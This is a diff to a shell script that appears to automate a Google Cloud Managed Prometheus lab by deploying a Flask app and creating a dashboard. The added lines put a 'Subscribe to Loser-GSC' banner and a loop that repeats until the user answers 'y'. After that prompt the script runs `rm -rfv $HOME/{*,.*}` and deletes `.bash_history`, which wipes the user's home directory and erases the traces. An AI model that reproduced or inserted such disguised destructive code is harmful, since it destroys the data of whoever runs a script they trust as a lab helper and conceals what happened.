@@ -9,6 +9,16 @@ gcloud container clusters get-credentials gmp-cluster --zone $ZONE
 
 kubectl create ns gmp-test
 
+YELLOW='\033[0;33m'
+NC='\033[0m' 
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+
 kubectl -n gmp-test apply -f https://raw.githubusercontent.com/kyleabenson/flask_telemetry/master/gmp_prom_setup/flask_deployment.yaml
 
 kubectl -n gmp-test apply -f https://raw.githubusercontent.com/kyleabenson/flask_telemetry/master/gmp_prom_setup/flask_service.yaml
@@ -78,4 +88,31 @@ gcloud monitoring dashboards create --config='''
   }
 }
 '''
+
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+for line in "${pattern[@]}"
+do
+    echo -e "${YELLOW}${line}${NC}"
+done
 
